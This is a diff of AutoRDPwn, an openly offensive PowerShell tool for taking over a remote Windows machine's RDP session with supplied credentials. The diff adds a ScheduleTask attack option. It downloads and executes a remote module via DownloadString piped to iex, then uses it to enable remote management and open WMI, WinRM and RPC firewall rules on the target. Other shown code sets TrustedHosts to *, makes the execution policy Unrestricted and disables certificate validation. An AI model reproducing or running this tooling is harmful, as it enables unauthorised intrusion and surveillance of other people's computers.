@@ -1,6 +1,6 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v2.2 - by @JoelGMSec"
+$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v2.4 - by @JoelGMSec"
 $Host.UI.RawUI.BackgroundColor = 'Black'
 $Host.UI.RawUI.ForegroundColor = 'Gray'
 $Host.PrivateData.ErrorForegroundColor = 'Red'
@@ -13,7 +13,7 @@ Clear-Host
 function Show-Menu {
 
      Write-Host ""
-     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue; Write-Host "         v2.2  " -ForegroundColor Yellow
+     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue; Write-Host "         v2.4  " -ForegroundColor Yellow
      Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue; Write-Host "_  _  _______  " -ForegroundColor Green
      Write-Host "  /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta; Write-Host "|       _/|     \ |    ___/" -NoNewLine -ForegroundColor Blue; Write-Host " \/ \/ /     \ " -ForegroundColor Green
      Write-Host " /  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta; Write-Host "|   |    \|_____/ |   |" -NoNewLine -ForegroundColor Blue; Write-Host " \        /   |   \" -ForegroundColor Green
@@ -24,7 +24,8 @@ function Show-Menu {
      Write-Host "" 
      Write-Host "[1] - Lanzar el ataque a través de PsExec"
      Write-Host "[2] - Lanzar el ataque a través de WMI"
-     Write-Host "[3] - Cerrar el programa"
+     Write-Host "[3] - Lanzar el ataque a través de ScheduleTask"
+     Write-Host "[4] - Cerrar el programa"
      Write-Host "" }
 
 Set-StrictMode -Version Latest
@@ -90,7 +91,22 @@ function ConvertFrom-SecureToPlain {
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes ; netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes"
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" }
 
-        '3' { exit }
+        '3' {
+        Write-Host ""
+        $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
+        Write-Host ""
+        $user = Read-Host -Prompt 'Y el usuario?'
+        Write-Host ""
+        $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
+        Write-Host ""
+        $Host.UI.RawUI.ForegroundColor = 'Cyan'
+	$credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
+	(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs.psm1") | iex
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe winrm quickconfig -quiet; Enable-PSRemoting -Force; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private }
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes ; netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes }
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes }}
+
+        '4' { exit }
 
         default {
         Write-Host ""
@@ -132,8 +148,8 @@ winrm quickconfig -quiet; Set-Item wsman:\localhost\client\trustedhosts * -Force
       } until ($input -in 'ver','controlar')
 
 Write-Host ""
-$cred= New-Object System.Management.Automation.PSCredential ("$user", $password )
-$RDP = New-PSSession -Computer $computer -credential $cred
+$credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
+$RDP = New-PSSession -Computer $computer -credential $credential
 
     invoke-command -session $RDP[0] -scriptblock {
     powershell Set-Executionpolicy UnRestricted
@@ -175,7 +191,6 @@ $Host.UI.RawUI.ForegroundColor = 'Gray'
         ServicePoint srvPoint, X509Certificate certificate,
         WebRequest request, int certificateProblem) {
         return true; }}
-
 "@
 $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
